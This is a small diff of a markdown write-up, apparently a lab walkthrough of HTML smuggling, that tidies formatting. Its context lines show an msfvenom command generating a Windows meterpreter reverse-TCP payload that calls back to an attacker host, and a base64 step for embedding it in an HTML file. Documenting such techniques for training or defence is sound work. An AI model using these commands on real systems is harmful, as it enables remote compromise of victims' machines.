@@ -53,8 +53,7 @@ Bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o smuggled_payload.exe
 
 ### 2. Assembling the Smuggling Document:
-The binary was converted into a Base64 string and embedded inside a client-side JavaScript block within T1027_006_smuggling.html.
-Bash
+The binary was converted into a Base64 string and embedded inside a client-side JavaScript block within T1027_006_smuggling.html
 
 base64 -w 0 payload.exe > base64_exe.txt
 
